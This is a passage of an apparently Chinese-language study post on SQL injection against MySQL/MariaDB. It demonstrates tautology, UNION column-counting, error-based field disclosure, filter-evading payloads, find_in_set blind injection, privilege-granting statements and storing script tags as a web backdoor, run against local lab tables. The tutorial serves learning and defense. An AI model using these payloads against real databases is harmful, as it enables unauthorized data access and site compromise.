NULL |</span><br><span class="hljs-comment">+----------+--------+</span><br><span class="hljs-comment">这个左连接：最后得到的是左表user1中所有的username的值和右表user2中uid两个表都有的mobile值</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">select</span> a.username,b.mobile <span class="hljs-keyword">from</span> user1 a <span class="hljs-keyword">right</span> <span class="hljs-keyword">join</span> user2 b <span class="hljs-keyword">on</span> a.uid<span class="hljs-operator">=</span>b.uid;<br><span class="hljs-comment">/*+----------+---------+</span><br><span class="hljs-comment">| username | mobile  |</span><br><span class="hljs-comment">+----------+---------+</span><br><span class="hljs-comment">| reader1  |    NULL |</span><br><span class="hljs-comment">| reader2  |    NULL |</span><br><span class="hljs-comment">| admin    |     123 |</span><br><span class="hljs-comment">| NULL     | 1231111 |</span><br><span class="hljs-comment">+----------+---------+</span><br><span class="hljs-comment">这个右连接：最后得到的是右表user2中mobile所有的数据和左表user1中uid两个表都有的username*/</span><br><br><br><br><br>空集注入逻辑(这种操作网页不报错，但显示页面没有内容)<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">root@kali-PC:/home/reader# echo $uname</span><br><span class="hljs-comment">1111&#x27; or &#x27;0&#x27;=&#x27;9</span><br><span class="hljs-comment">root@kali-PC:/home/reader# mysql -vvv -u root -p test1 -e &quot;select * from user2 where username=&#x27;$uname&#x27;&quot; </span><br><span class="hljs-comment">Enter password: </span><br><span class="hljs-comment">--------------</span><br><span class="hljs-comment">select * from user2 where username=&#x27;1111&#x27; or &#x27;0&#x27;=&#x27;9&#x27;</span><br><span class="hljs-comment">--------------</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Empty set (0.00 sec)</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Bye</span><br><span class="hljs-comment">*/</span><br>全集注入逻辑（网页不报错，但是页面正常或者页数更多等）<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">root@kali-PC:/home/reader# uname=&quot;111&#x27; or &#x27;1&#x27;=&#x27;1&quot;</span><br><span class="hljs-comment">root@kali-PC:/home/reader# echo $uname</span><br><span class="hljs-comment">111&#x27; or &#x27;1&#x27;=&#x27;1</span><br><span class="hljs-comment">root@kali-PC:/home/reader# mysql -vvv -u root -p test1 -e &quot;select * from user2 where username=&#x27;$uname&#x27;&quot; </span><br><span class="hljs-comment">Enter password: </span><br><span class="hljs-comment">--------------</span><br><span class="hljs-comment">select * from user2 where username=&#x27;111&#x27; or &#x27;1&#x27;=&#x27;1&#x27;</span><br><span class="hljs-comment">--------------</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">+----------+-------+----------+---------+</span><br><span class="hljs-comment">| username | uid   | password | mobile  |</span><br><span class="hljs-comment">+----------+-------+----------+---------+</span><br><span class="hljs-comment">| reader1  | 12136 | NULL     |    NULL |</span><br><span class="hljs-comment">| reader2  | 12138 | NULL     |    NULL |</span><br><span class="hljs-comment">| admin    | 12137 | 123      |     123 |</span><br><span class="hljs-comment">| admin2   | 12133 | 111123   | 1231111 |</span><br><span class="hljs-comment">+----------+-------+----------+---------+</span><br><span class="hljs-comment">4 rows in set (0.00 sec)</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Bye</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure>
+<p><strong>联合注入逻辑</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">/*MariaDB [test1]&gt; select * from user1;</span><br><span class="hljs-comment">+----------+-------+----------+--------+</span><br><span class="hljs-comment">| username | uid   | password | mobile |</span><br><span class="hljs-comment">+----------+-------+----------+--------+</span><br><span class="hljs-comment">| reader1  | 12136 | NULL     |   NULL |</span><br><span class="hljs-comment">| reader2  | 12138 | NULL     |   NULL |</span><br><span class="hljs-comment">| admin    | 12137 | 123      |    123 |</span><br><span class="hljs-comment">| admin1   | 12135 | 111123   |    123 |</span><br><span class="hljs-comment">| admin2   | 12134 | 111123   |    123 |</span><br><span class="hljs-comment">+----------+-------+----------+--------+</span><br><span class="hljs-comment">5 rows in set (0.00 sec)</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">MariaDB [test1]&gt; select * from user2;</span><br><span class="hljs-comment">+----------+-------+----------+---------+</span><br><span class="hljs-comment">| username | uid   | password | mobile  |</span><br><span class="hljs-comment">+----------+-------+----------+---------+</span><br><span class="hljs-comment">| reader1  | 12136 | NULL     |    NULL |</span><br><span class="hljs-comment">| reader2  | 12138 | NULL     |    NULL |</span><br><span class="hljs-comment">| admin    | 12137 | 123      |     123 |</span><br><span class="hljs-comment">| admin2   | 12133 | 111123   | 1231111 |</span><br><span class="hljs-comment">+----------+-------+----------+---------+</span><br><span class="hljs-comment">4 rows in set (0.00 sec)</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">MariaDB [test1]&gt; select * from user1 union select * from user2;</span><br><span class="hljs-comment">+----------+-------+----------+---------+</span><br><span class="hljs-comment">| username | uid   | password | mobile  |</span><br><span class="hljs-comment">+----------+-------+----------+---------+</span><br><span class="hljs-comment">| reader1  | 12136 | NULL     |    NULL |</span><br><span class="hljs-comment">| reader2  | 12138 | NULL     |    NULL |</span><br><span class="hljs-comment">| admin    | 12137 | 123      |     123 |</span><br><span class="hljs-comment">| admin1   | 12135 | 111123   |     123 |</span><br><span class="hljs-comment">| admin2   | 12134 | 111123   |     123 |</span><br><span class="hljs-comment">| admin2   | 12133 | 111123   | 1231111 |</span><br><span class="hljs-comment">+----------+-------+----------+---------+</span><br><span class="hljs-comment">6 rows in set (0.00 sec)</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br>从上面的事例可以看出，<span class="hljs-keyword">union</span>会将两个查询语句的结果合并在一起，并且去掉重复的数据。<br><br><br><span class="hljs-comment">/*MariaDB [test1]&gt; select username,uid from user1 union select &#x27;reader1&#x27;,&#x27;12136&#x27;;</span><br><span class="hljs-comment">+----------+-------+</span><br><span class="hljs-comment">| username | uid   |</span><br><span class="hljs-comment">+----------+-------+</span><br><span class="hljs-comment">| reader1  | 12136 |</span><br><span class="hljs-comment">| reader2  | 12138 |</span><br><span class="hljs-comment">| admin    | 12137 |</span><br><span class="hljs-comment">| admin1   | 12135 |</span><br><span class="hljs-comment">| admin2   | 12134 |</span><br><span class="hljs-comment">+----------+-------+</span><br><span class="hljs-comment">5 rows in set (0.00 sec)</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br>从上面的事例可以看出，我们可以利用<span class="hljs-keyword">union</span>来查询自己构造的语句<br>例如：利用自己构造的恶意语句判断字段数<br><span class="hljs-comment">/*root@kali-PC:/home/reader# uname=&quot;reader1&#x27; union select 1 and &#x27;1&#x27;=&#x27;1&quot;</span><br><span class="hljs-comment">root@kali-PC:/home/reader# echo $uname</span><br><span class="hljs-comment">reader1&#x27; union select 1 and &#x27;1&#x27;=&#x27;1</span><br><span class="hljs-comment">root@kali-PC:/home/reader# mysql -u root -p test1 -e &quot;select * from user2 where username=&#x27;$uname&#x27;&quot; </span><br><span class="hljs-comment">Enter password: </span><br><span class="hljs-comment">ERROR 1222 (21000) at line 1: The used SELECT statements have a different number of columns</span><br><span class="hljs-comment">root@kali-PC:/home/reader# uname=&quot;reader1&#x27; union select 1,2,3,4 and &#x27;1&#x27;=&#x27;1&quot;</span><br><span class="hljs-comment">root@kali-PC:/home/reader# mysql -u root -p test1 -e &quot;select * from user2 where username=&#x27;$uname&#x27;&quot; </span><br><span class="hljs-comment">Enter password: </span><br><span class="hljs-comment">+----------+-------+----------+--------+</span><br><span class="hljs-comment">| username | uid   | password | mobile |</span><br><span class="hljs-comment">+----------+-------+----------+--------+</span><br><span class="hljs-comment">| reader1  | 12136 | NULL     |   NULL |</span><br><span class="hljs-comment">| 1        |     2 | 3        |      1 |</span><br><span class="hljs-comment">*/</span><br><br></code></pre></td></tr></table></figure>
+
+
+<h3 id="3-sql的DCL语言（数据控制语言）"><a href="#3-sql的DCL语言（数据控制语言）" class="headerlink" title="3.sql的DCL语言（数据控制语言）"></a>3.sql的DCL语言（数据控制语言）</h3><p>主要是管理员DBA来管理权限使用的，注入的目标是<strong>提升权限</strong>。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> host,<span class="hljs-keyword">user</span>,password <span class="hljs-keyword">from</span> mysql.user;<br><span class="hljs-comment">-- 用来查看数据库中有哪些用户</span><br><span class="hljs-keyword">grant</span> <span class="hljs-keyword">all</span> privileges <span class="hljs-keyword">on</span> <span class="hljs-operator">*</span>.<span class="hljs-operator">*</span> <span class="hljs-keyword">to</span> reader@`<span class="hljs-operator">%</span>` identified <span class="hljs-keyword">by</span> <span class="hljs-string">&#x27;abc&#x27;</span>;<br><span class="hljs-comment">--授权给reader用户可以在任意地方(@`%`)对任意数据库表（*.*）,密码是abc的所有权限</span><br><br><span class="hljs-keyword">grant</span> <span class="hljs-keyword">select</span>,<span class="hljs-keyword">insert</span> <span class="hljs-keyword">on</span> <span class="hljs-operator">*</span>.<span class="hljs-operator">*</span> <span class="hljs-keyword">to</span> reader@`<span class="hljs-operator">%</span>` identified <span class="hljs-keyword">by</span> <span class="hljs-string">&#x27;abc&#x27;</span>;<br><span class="hljs-comment">--授权给reader用户可以在任意地方对任意数据库表实现select，insert操作，密码是abc</span><br></code></pre></td></tr></table></figure>
+
+
+<h3 id="4-SQL-DML语言-数据操作语言"><a href="#4-SQL-DML语言-数据操作语言" class="headerlink" title="4.SQL(DML语言)数据操作语言"></a>4.SQL(DML语言)数据操作语言</h3><h4 id="1-sql报错逻辑"><a href="#1-sql报错逻辑" class="headerlink" title="1.sql报错逻辑"></a>1.sql报错逻辑</h4><p><strong>1.数值（和时间）越界报错</strong></p>
+<p>mysql的整数比其它数据库更细分粒度，因为能有更好的性能</p>
+<p><strong>补充：</strong>数值越界的报错有包括时间的报错</p>
+<p>date,time,datetime,timetamp(这些是sql中时间的数据类型)</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">create</span>	<span class="hljs-keyword">table</span> test10(uid1 tinyint,uid2 <span class="hljs-type">smallint</span>,uid3 mediumint,uid4 <span class="hljs-type">int</span>,uid5 <span class="hljs-type">bigint</span>,salary1 <span class="hljs-type">float</span>,salary2 <span class="hljs-type">decimal</span>(<span class="hljs-number">7</span>,<span class="hljs-number">2</span>),salary3 <span class="hljs-keyword">double</span>)；<br>正常插入数据<br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> test10 <span class="hljs-keyword">values</span>(<span class="hljs-number">12</span>,<span class="hljs-number">123</span>,<span class="hljs-number">1234</span>,<span class="hljs-number">1234567890</span>,<span class="hljs-number">1234567890</span>,<span class="hljs-number">1234</span>,<span class="hljs-number">1234.56</span>,<span class="hljs-number">12345.67</span>);<br>注入型插入数据<br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> test10<br><span class="hljs-keyword">values</span>(<span class="hljs-number">1234567890</span>,<span class="hljs-number">1234567890</span>,<span class="hljs-number">1234567890</span>,<span class="hljs-number">1234567890</span>,<span class="hljs-number">1234567890</span>,<span class="hljs-number">1234</span>,<span class="hljs-number">12341234567890.56</span>,<span class="hljs-number">1234567890.67</span>);<br>取值范围报错，目的是得到字段名<br><span class="hljs-comment">/*MariaDB [test1]&gt; insert into test10</span><br><span class="hljs-comment">    -&gt; values(1234567890,1234567890,1234567890,1234567890,1234567890,1234,12341234567890.56,1234567890.67);</span><br><span class="hljs-comment">Query OK, 1 row affected, 4 warnings (0.01 sec)</span><br><span class="hljs-comment">可以看到者发现4个错误</span><br><span class="hljs-comment">MariaDB [test1]&gt; select * from test10;</span><br><span class="hljs-comment">+------+-------+---------+------------+------------+------------+----------+----------------+</span><br><span class="hljs-comment">| uid1 | uid2  | uid3    | uid4       | uid5       | salary1    | salary2  | salary3        |</span><br><span class="hljs-comment">+------+-------+---------+------------+------------+------------+----------+----------------+</span><br><span class="hljs-comment">|   12 |   123 |    1234 | 1234567890 | 1234567890 |       1234 |  1234.56 |       12345.67 |</span><br><span class="hljs-comment">|  127 | 32767 | 8388607 | 1234567890 | 1234567890 | 1234570000 | 99999.99 | 1234567890.567 |</span><br><span class="hljs-comment">|  127 | 32767 | 8388607 | 1234567890 | 1234567890 |       1234 | 99999.99 |  1234567890.67 |</span><br><span class="hljs-comment">+------+-------+---------+------------+------------+------------+----------+----------------+</span><br><span class="hljs-comment">3 rows in set (0.00 sec)</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">show</span> warnings<br>就可以将报错信息展示出来，可以看到爆出了字段名<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">MariaDB [test1]&gt; insert into test10 values(1234567890,1234567890,1234567890,1234567890,1234567890,1234,12341234567890.56,1234567890.67);</span><br><span class="hljs-comment">Query OK, 1 row affected, 4 warnings (0.01 sec)</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">MariaDB [test1]&gt; show warnings;</span><br><span class="hljs-comment">+---------+------+--------------------------------------------------+</span><br><span class="hljs-comment">| Level   | Code | Message                                          |</span><br><span class="hljs-comment">+---------+------+--------------------------------------------------+</span><br><span class="hljs-comment">| Warning | 1264 | Out of range value for column &#x27;uid1&#x27; at row 1    |</span><br><span class="hljs-comment">| Warning | 1264 | Out of range value for column &#x27;uid2&#x27; at row 1    |</span><br><span class="hljs-comment">| Warning | 1264 | Out of range value for column &#x27;uid3&#x27; at row 1    |</span><br><span class="hljs-comment">| Warning | 1264 | Out of range value for column &#x27;salary2&#x27; at row 1 |</span><br><span class="hljs-comment">+---------+------+--------------------------------------------------+</span><br><span class="hljs-comment">4 rows in set (0.00 sec)</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure>
+
+
+<p><strong>2.数值（和时间）类型转换报错逻辑</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs sql">当我们插入的时候，传入的参数并不是于它的类型一致的时候，会进行报错,也会将字段名进行爆出，或者判断对方的数据类型<br>例如：<br><span class="hljs-comment">/*MariaDB [test1]&gt; insert into test10(uid1,uid2) values(&#x27;reader&#x27;,&#x27;haha&#x27;);</span><br><span class="hljs-comment">Query OK, 1 row affected, 2 warnings (0.00 sec)</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">MariaDB [test1]&gt; show warnings;</span><br><span class="hljs-comment">+---------+------+--------------------------------------------------------------+</span><br><span class="hljs-comment">| Level   | Code | Message                                                      |</span><br><span class="hljs-comment">+---------+------+--------------------------------------------------------------+</span><br><span class="hljs-comment">| Warning | 1366 | Incorrect integer value: &#x27;reader&#x27; for column &#x27;uid1&#x27; at row 1 |</span><br><span class="hljs-comment">| Warning | 1366 | Incorrect integer value: &#x27;haha&#x27; for column &#x27;uid2&#x27; at row 1   |</span><br><span class="hljs-comment">+---------+------+--------------------------------------------------------------+</span><br><span class="hljs-comment">2 rows in set (0.00 sec)</span><br><span class="hljs-comment">*/</span><br><br></code></pre></td></tr></table></figure>
+<p><strong>3.空集和全集逻辑</strong></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs routeros">简单的组合全集逻辑<br>or--+<span class="hljs-attribute">2</span>=--!!!2<br><span class="hljs-keyword">or</span> <span class="hljs-attribute">1</span>=1<br>简单的组合空集逻辑<br><span class="hljs-keyword">and</span> !!!<span class="hljs-attribute">2</span>=~2<br><span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=2<br><br>使用--!!!的目的是规避空格的检查，甚至可替换为空格站位<br><br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from where uname=<span class="hljs-variable">$uid</span>&quot;</span><br>正常传参<br>10003<br>注入传参<br>10003 or--+<span class="hljs-attribute">2</span>=--!!!2<br>可以查询表的全部数据<br></code></pre></td></tr></table></figure>
+
+
+<p><strong>4.字符类型</strong></p>
+<p>字符类型包括:char（固定长度字符串）、varchar（可变长度字符串）、binary(固定长度的二进制字符类型)、varbinary（可变的二进制字符类型）【前面这几个都是字符串长度不长的情况】、blob（保存较大的二进制数据时使用）、text（保存较大文本时）、enum(枚举，插入时只能插入我们创建时规定的其中一个元素)、set（集合，插入时只能插入我们创建时规定中一个或多个元素）</p>
+<p><strong>字符越界报错</strong>和前面讲到的数值类型和时间类型的越界报错处理差不多，可以推断目标字段的功能和字段名。</p>
+<p><strong>类型转换错误：</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> uname<span class="hljs-operator">=</span><span class="hljs-string">&#x27;&#x27;</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;&#x27;</span>;<br><br>获得该表的所有的记录<br>获取字段具体值<br><br></code></pre></td></tr></table></figure>
+<p><strong>Text类型</strong>最大的应用就是留后门脚本注入到web服务器，其它字符类型因长度原因难以发挥</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> testc(blog) <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;&lt;script language=&quot;javascript&quot;&gt;gogogo&lt;/script&gt;&#x27;</span>)<br></code></pre></td></tr></table></figure>
+<p><strong>enum和set</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">/*MariaDB [test1]&gt; create table testd(uname1 enum(&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;),uname2 set(&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;));</span><br><span class="hljs-comment">Query OK, 0 rows affected (0.01 sec)</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">MariaDB [test1]&gt; show create table testd;</span><br><span class="hljs-comment">+-------+----------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="hljs-comment">| Table | Create Table                                                                                                                                       |</span><br><span class="hljs-comment">+-------+----------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="hljs-comment">| testd | CREATE TABLE `testd` (</span><br><span class="hljs-comment">  `uname1` enum(&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;) DEFAULT NULL,</span><br><span class="hljs-comment">  `uname2` set(&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;) DEFAULT NULL</span><br><span class="hljs-comment">) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 |</span><br><span class="hljs-comment">+-------+----------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="hljs-comment">1 row in set (0.00 sec)</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> testd <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;a,b&#x27;</span>);<br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> testd <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;a,b&#x27;</span>);<span class="hljs-comment">--d元素并不存在我们创建uname1是规定的枚举元素里</span><br><span class="hljs-comment">/*MariaDB [test1]&gt; insert into testd values(&#x27;a&#x27;,&#x27;a,b&#x27;);</span><br><span class="hljs-comment">Query OK, 1 row affected (0.01 sec)</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">MariaDB [test1]&gt; insert into testd values(&#x27;d&#x27;,&#x27;a,b&#x27;);</span><br><span class="hljs-comment">Query OK, 1 row affected, 1 warning (0.01 sec)</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">MariaDB [test1]&gt; show warnings;</span><br><span class="hljs-comment">+---------+------+---------------------------------------------+</span><br><span class="hljs-comment">| Level   | Code | Message                                     |</span><br><span class="hljs-comment">+---------+------+---------------------------------------------+</span><br><span class="hljs-comment">| Warning | 1265 | Data truncated for column &#x27;uname1&#x27; at row 1 |</span><br><span class="hljs-comment">+---------+------+---------------------------------------------+</span><br><span class="hljs-comment">1 row in set (0.00 sec)</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> testd <span class="hljs-keyword">where</span> find_in_set(<span class="hljs-string">&#x27;a&#x27;</span>,uname2);<br><span class="hljs-comment">--find_in_setd()函数的作用是查找第一个参数是否存在第二个参数（集合类型）中</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">MariaDB [test1]&gt; select * from testd;</span><br><span class="hljs-comment">+--------+--------+</span><br><span class="hljs-comment">| uname1 | uname2 |</span><br><span class="hljs-comment">+--------+--------+</span><br><span class="hljs-comment">| a      | a,b    |</span><br><span class="hljs-comment">|        | a,b    |</span><br><span class="hljs-comment">+--------+--------+</span><br><span class="hljs-comment">2 rows in set (0.00 sec)</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">MariaDB [test1]&gt; select * from testd where find_in_set(&#x27;a&#x27;,uname2);</span><br><span class="hljs-comment">+--------+--------+</span><br><span class="hljs-comment">| uname1 | uname2 |</span><br><span class="hljs-comment">+--------+--------+</span><br><span class="hljs-comment">| a      | a,b    |</span><br><span class="hljs-comment">|        | a,b    |</span><br><span class="hljs-comment">+--------+--------+</span><br><span class="hljs-comment">2 rows in set (0.00 sec)</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">MariaDB [test1]&gt; select * from testd where find_in_set(&#x27;c&#x27;,uname2);</span><br><span class="hljs-comment">Empty set (0.00 sec)</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">MariaDB [test1]&gt; </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br>find_in_set()在盲注中的利用<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> uname<span class="hljs-operator">=</span><span class="hljs-string">&#x27;$uname&#x27;</span> <span class="hljs-keyword">and</span> find_in_set(<span class="hljs-keyword">left</span>(uname,<span class="hljs-number">1</span>),<span class="hljs-string">&#x27;a,b,c&#x27;</span>)<span class="hljs-operator">=</span><span class="hljs-number">1</span><br><span class="hljs-comment">--这句注入语句的含义是判断uname字段中左边第一个字符是等于&#x27;a,b,c&#x27;中 的a吗</span><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> uname<span class="hljs-operator">=</span><span class="hljs-string">&#x27;$uname&#x27;</span> <span class="hljs-keyword">and</span> find_in_set(<span class="hljs-keyword">left</span>(version(),<span class="hljs-number">1</span>),<span class="hljs-string">&#x27;1,2,3,4,5,6&#x27;</span>)<span class="hljs-operator">&gt;</span><span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure>
+<h4 id="2-运算符"><a href="#2-运算符" class="headerlink" title="2.运算符"></a>2.运算符</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">=</span><br><span class="hljs-operator">&amp;&amp;</span><br><span class="hljs-operator">~</span><span class="hljs-operator">~</span><br><span class="hljs-operator">!</span><br><span class="hljs-operator">||</span><br></code></pre></td></tr></table></figure>
+
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs sql">MariaDB [test1]<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">~</span><span class="hljs-operator">~</span><span 